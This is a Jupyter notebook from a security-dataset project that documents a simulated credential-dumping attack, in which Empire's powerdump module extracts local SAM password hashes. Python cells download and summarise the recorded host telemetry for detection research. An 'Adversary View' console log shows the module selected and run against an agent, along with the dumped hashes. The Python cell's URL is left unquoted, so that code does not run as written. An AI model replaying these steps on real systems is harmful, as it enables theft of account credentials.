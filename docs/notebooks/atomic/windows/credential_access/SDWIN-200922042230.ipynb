{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "19506f9e",
   "metadata": {},
   "source": [
    "# Empire Powerdump Extract Hashes"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0fe96ce8",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ab026b47",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Contributors      | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| Creation Date     | 2020/09/22 |\n",
    "| Modification Date | 2020/09/22 |\n",
    "| Tactics           | [TA0006](https://attack.mitre.org/tactics/TA0006) |\n",
    "| Techniques        | [T1003.002](https://attack.mitre.org/techniques/T1003/002) |\n",
    "| Tags              | Calculating SysKey,SAM Read |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9d2bb0bc",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries calculating the SysKey to decrypt Security Account Mannager (SAM) database entries (from registry or hive) and get NTLM, and sometimes LM hashes of local accounts password."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5aec6c10",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0609bee0",
   "metadata": {},
   "source": [
    "\n",
    "| Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/empire_powerdump_sam_access.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/empire_powerdump_sam_access.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "51c5da76",
   "metadata": {},
   "source": [
    "## Simulation Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e57e9940",
   "metadata": {},
   "source": [
    "### Tools"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2923875d",
   "metadata": {},
   "source": [
    "\n",
    "| type | Name | Module |\n",
    "|:-----|:-----|--------|\n",
    "| C2 | Empire | [powerdump](https://github.com/OTRF/Blacksmith/blob/master/aws/Security-Datasets/cfn-files/scripts/Invoke-Mimikatz.ps1) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7c282d4b",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "(Empire: powershell/credentials/mimikatz/sam) > agents\n",
    "\n",
    "[*] Active agents:\n",
    "\n",
    "Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n",
    "----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n",
    "WE8XYD3K ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5972   5/0.0    2020-09-22 08:21:35  http            \n",
    "\n",
    "(Empire: agents) > interact WE8XYD3K\n",
    "(Empire: WE8XYD3K) > usemodule credentials/powerdump*\n",
    "(Empire: powershell/credentials/powerdump) > info\n",
    "\n",
    "              Name: Invoke-PowerDump\n",
    "            Module: powershell/credentials/powerdump\n",
    "        NeedsAdmin: True\n",
    "        OpsecSafe: True\n",
    "          Language: powershell\n",
    "MinLanguageVersion: 2\n",
    "        Background: True\n",
    "  OutputExtension: None\n",
    "\n",
    "Authors:\n",
    "  DarkOperator\n",
    "  winfang\n",
    "  Kathy Peters\n",
    "  ReL1K\n",
    "\n",
    "Description:\n",
    "  Dumps hashes from the local system using Posh-SecMod's\n",
    "  Invoke-PowerDump\n",
    "\n",
    "Comments:\n",
    "  https://github.com/darkoperator/Posh-\n",
    "  SecMod/blob/master/PostExploitation/PostExploitation.psm1\n",
    "\n",
    "Options:\n",
    "\n",
    "  Name  Required    Value                     Description\n",
    "  ----  --------    -------                   -----------\n",
    "  Agent True        WE8XYD3K                  Agent to run module on.                 \n",
    "\n",
    "(Empire: powershell/credentials/powerdump) > execute\n",
    "[*] Tasked WE8XYD3K to run TASK_CMD_JOB\n",
    "[*] Agent WE8XYD3K tasked with task ID 4\n",
    "[*] Tasked agent WE8XYD3K to run module powershell/credentials/powerdump\n",
    "(Empire: powershell/credentials/powerdump) > \n",
    "Job started: TASK2D\n",
    "\n",
    "wardog:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n",
    "Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n",
    "DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n",
    "\n",
    "(Empire: powershell/credentials/powerdump) >\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a542fff7",
   "metadata": {},
   "source": [
    "## Explore Datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "610eb6e7",
   "metadata": {},
   "source": [
    "### Download & Decompress Dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1de56ba9",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from zipfile import ZipFile\n",
    "from io import BytesIO\n",
    "\n",
    "url = https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/empire_powerdump_sam_access.zip\n",
    "zipFileRequest = requests.get(url)\n",
    "zipFile = ZipFile(BytesIO(zipFileRequest.content))\n",
    "datasetJSONPath = zipFile.extract(zipFile.namelist()[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "61f5dcda",
   "metadata": {},
   "source": [
    "### Read JSON File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cca42a75",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pandas.io import json\n",
    "\n",
    "df = json.read_json(path_or_buf=datasetJSONPath, lines=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "37c40241",
   "metadata": {},
   "source": [
    "### Access Security Events"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e7ec0e39",
   "metadata": {},
   "outputs": [],
   "source": [
    "df.groupby(['Channel']).size().sort_values(ascending=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "dc6f341e",
   "metadata": {},
   "source": [
    "## References\n",
    "* [https://github.com/GhostPack/Rubeus#example-over-pass-the-hash](https://github.com/GhostPack/Rubeus#example-over-pass-the-hash) "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 5
}
